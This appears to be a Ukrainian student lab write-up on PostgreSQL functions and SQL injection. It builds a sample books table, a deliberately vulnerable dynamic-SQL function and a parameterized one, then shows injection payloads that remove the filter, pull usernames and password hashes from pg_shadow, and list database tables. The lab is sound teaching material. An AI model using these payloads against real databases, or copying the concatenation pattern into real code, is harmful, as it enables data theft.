## 2.2.1 Створити функцію get_data по отриманню рядків таблиці на основі SQL-запиту з використанням атрибуту строкового типу, наприклад: SELECT * FROM ТАБЛИЦЯ WHERE АТРИБУТ = 'ЗНАЧЕННЯ'


### Створення таблиці даних: 

CREATE TABLE books (<br>
  book_id INT NOT NULL,<br>
  book_name VARCHAR(30) NOT NULL,<br>
publisher VARCHAR(30) NOT NULL,<br>
  PRIMARY KEY (book_id),<br>
  UNIQUE (book_name)<br>
);<br>

INSERT INTO books <br>
    (book_id, book_name, publisher) <br>
VALUES <br>
    (1, 'Buratino', 'Penguin'),<br>
    (2,'Chipollino', 'Lion'),<br>
    (3,'Odyssey', 'Crocodile');<br>


![8_1](https://user-images.githubusercontent.com/120367818/213988191-0f3aff42-625a-43d6-a617-55b8e5488f24.png)

### Приклад 1 SQL-запиту із поодинокою шаблонною змінною 

CREATE OR REPLACE FUNCTION get_books_by_name1(b_name VARCHAR)<br>
RETURNS TABLE<br>
(book_id INTEGER, book_name VARCHAR, publisher VARCHAR)<br>
AS $$<br>
DECLARE str VARCHAR;<br>
BEGIN 	str := 'SELECT * <br>
from books <br>
where book_name = ''' ||b_name|| ''''; <br>
RAISE NOTICE 'Query=%',str; <br>
RETURN QUERY EXECUTE str; <br>
END; <br>
$$ LANGUAGE plpgsql;<br>

![8_2](https://user-images.githubusercontent.com/120367818/213988480-a0f66955-2c83-464b-af72-e91434d0795c.png)


### Перевірка: 

select * from get_books_by_name1('Buratino');

![8_3](https://user-images.githubusercontent.com/120367818/213988713-347d07dd-0df2-42c3-9ab2-e0887fe6956b.png)


### Приклад 2 SQL-запиту із поодинокою шаблонною змінною

CREATE FUNCTION get_books_by_name2(book_name  text) <br>
RETURNS SETOF books AS $$ <br>
SELECT * from books where book_name  = $1; <br>
$$ LANGUAGE SQL; <br>

![8_4](https://user-images.githubusercontent.com/120367818/213988901-1aefa00d-248c-420e-be7f-a405b33cdc29.png)

select * from get_books_by_name2('Buratino');

![8_5](https://user-images.githubusercontent.com/120367818/213989734-3d220896-f52e-45c8-9e56-fa9ea2f09a5a.png)

## 2.2.2 Створити виклики функції з SQL-ін'єкціями по порушенню конфіденційності даних, приклади яких представлені в теоретичних відомостях.

### Приклади SQL-ін'єкцій порушення конфіденційності:
− зняття фільтрації рідків умови SQL-запиту; <br>

select * from get_books_by_name1 ('1'' OR 1=1 -- ');

![8_6](https://user-images.githubusercontent.com/120367818/213990621-3d31ab16-d91b-44d2-85cb-a3866d0d11d2.png)


− отримання вмісту таблиць, що не входять у SQL-запит; <br>

select * from get_books_by_name1 ('1'' UNION SELECT CAST(USESYSID AS
INTEGER),CAST(USENAME AS VARCHAR), CAST(PASSWD AS VARCHAR) FROM
PG_SHADOW -- ');

![8_7a](https://user-images.githubusercontent.com/120367818/213991358-430744fd-1bb4-4a62-b93c-be2bc5e697dd.png)


− отримання структури таблиць БД; <br>

select * from get_books_by_name1 ('1'' UNION SELECT 1, CAST(TABLE_NAME AS
VARCHAR), CAST (NULL AS VARCHAR) FROM INFORMATION_SCHEMA.TABLES--');

![8_8](https://user-images.githubusercontent.com/120367818/213991643-6004a4ca-d63d-4bf1-b596-cf52da495df8.png)
